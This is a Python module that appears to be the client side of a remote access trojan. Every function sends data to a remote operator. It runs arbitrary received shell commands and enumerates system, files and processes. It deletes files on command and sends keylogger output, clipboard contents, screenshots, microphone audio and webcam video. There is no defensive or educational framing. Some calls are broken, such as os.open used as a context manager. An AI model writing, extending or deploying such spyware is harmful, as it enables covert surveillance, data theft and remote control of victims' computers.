import os
import struct
import pickle
import pyperclip
import pyautogui
import pyaudio
import cv2
import subprocess
import numpy as np
import tempfile
from .connection_module import SecureConnectionClient


def gather_system_info(connection, operation_system):
    try:
        cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        connection.send_data(stdout + stderr)
    except Exception as e:
        print(f"Error gathering system info: {e}")

def command_line_interface(connection):
    cmd = connection.receive_data()
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    connection.send_data(stdout + stderr)

def file_directory_discovery(connection, operation_system):
    cmd = "dir" if operation_system == "Windows" else "ls -l"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    connection.send_data(stdout + stderr)

def remote_file_copy(connection):  
    filename = connection.receive_data()
    connection.send_data(filename)

def file_deletion(connection):
    filename = connection.receive_data()
    os.remove(filename)

def process_discovery(connection, operation_system):
    cmd = "tasklist" if operation_system == "Windows" else "ps aux"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    connection.send_data(stdout + stderr)

def input_capture(connection):
    if os.path.exists("keys.txt"):
        with os.open("keys.txt") as file:
            file_size = os.path.getsize("keys.txt")
            bytes = os.read(file, file_size)
            connection.send_data(bytes)

def clipboard_data(connection):
    clboard = pyperclip.paste()
    clboard_bytes = clboard.encode("utf-8")
    connection.send_data(clboard_bytes)

def screenshot_capture(connection):
    tempfile.gettempdir()
    screenshot_path = tempfile.gettempdir() + "/screenshot.png"
    pyautogui.screenshot(screenshot_path)
    if os.path.exists(screenshot_path):
        with os.open(screenshot_path) as file:
            file_size = os.path.getsize(screenshot_path)
            bytes = os.read(file, file_size)
            connection.send_data(bytes)
            os.remove(screenshot_path)

def audio_capture(connection):
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100

        with pyaudio.PyAudio() as p:
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

            while True:
                bytes = connection.receive_data()
                if bytes.decode("utf-8") == "Stop":
                    break
                audio_data = stream.read(CHUNK)
                connection.send_data(audio_data)

    except Exception as e:
        print(f"Error in audio capture: {e}")
    finally:
        stream.stop_stream()
        stream.close()


def video_capture(connection):
    cap = cv2.VideoCapture(0)
    while True:
        do = connection.receive_data()
        if do == b"continue":
            ret, frame = cap.read()
            data = pickle.dumps(frame)
            message_size = struct.pack("L", len(data))
            connection.send_data(message_size + data)
        elif do == b"stop":
            break
    cap.release()

def screen_capture(connection):
    print("Capturing...")
    capturing = True
    while capturing:
        screenshot = pyautogui.screenshot()
        screenshot_np = np.array(screenshot)
        screenshot_np = cv2.resize(screenshot_np, (1280, 720))
        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_BGR2GRAY)

        # Compress image data
        _, img_encoded = cv2.imencode('.jpg', screenshot_np, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
        img_data = img_encoded.tobytes()

        try:
            connection.send_data(img_data)
        except Exception as e:
            print(f"Error sending image {e}")
            raise e
        signal = connection.receive_data()
        if signal == b"STOP":
            capturing = False